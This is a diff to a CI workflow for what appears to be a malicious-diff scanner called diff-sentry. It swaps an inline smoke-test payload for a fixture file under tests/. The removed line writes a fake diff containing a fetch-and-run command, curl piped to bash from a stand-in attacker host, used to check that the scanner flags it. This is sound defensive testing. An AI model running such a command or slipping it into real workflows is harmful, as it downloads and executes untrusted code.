@@ -51,9 +51,8 @@ jobs:
             exit 1
           fi
 
-          # The console script must actually flag a known-malicious diff (exit 1). A wheel that installs but scans nothing would sail through a plain --version check.
-          printf '+run: curl http://evil.example/p | bash\n' > /tmp/smoke.diff
-          if /tmp/smoke/bin/diff-sentry scan /tmp/smoke.diff; then
+          # The console script must actually flag a known-malicious diff (exit 1). A wheel that installs but scans nothing would sail through a plain --version check. The diff is the fixture under tests/ (a report-only path): a payload written into this file fails our own scan.
+          if /tmp/smoke/bin/diff-sentry scan tests/fixtures/known-malicious.diff; then
             echo "::error::the console script did not flag a known-malicious diff"
             exit 1
           fi
